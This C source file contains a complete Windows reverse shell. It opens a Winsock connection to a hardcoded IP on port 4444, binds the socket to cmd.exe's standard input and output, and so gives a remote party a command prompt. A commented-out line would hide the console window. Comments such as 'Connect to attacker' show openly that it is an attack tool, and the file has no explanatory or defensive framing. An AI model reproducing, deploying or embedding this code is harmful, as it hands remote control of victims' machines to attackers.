#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib") // Link against Winsock library (MSVC)

#define DEFAULT_IP "192.168.137.5" // <-- QUOTES AROUND THE IP
#define DEFAULT_PORT 4444           // Change this to your desired port

void reverse_shell(const char *ip, int port) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // Set up server address structure
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);
    if (server.sin_addr.s_addr == INADDR_NONE) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Connect to attacker
    if (WSAConnect(sock, (struct sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Prepare STARTUPINFO structure to redirect std handles to the socket
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Start the child process (cmd.exe) with redirected handles
    // We use "cmd.exe" to give the attacker a command prompt
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Wait for the process to exit and then clean up
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(sock);
    WSACleanup();
}

int main() {
    // Hide the console window (optional, often used in these scripts)
    //FreeConsole(); 

    reverse_shell(DEFAULT_IP, DEFAULT_PORT);
    return 0;
}
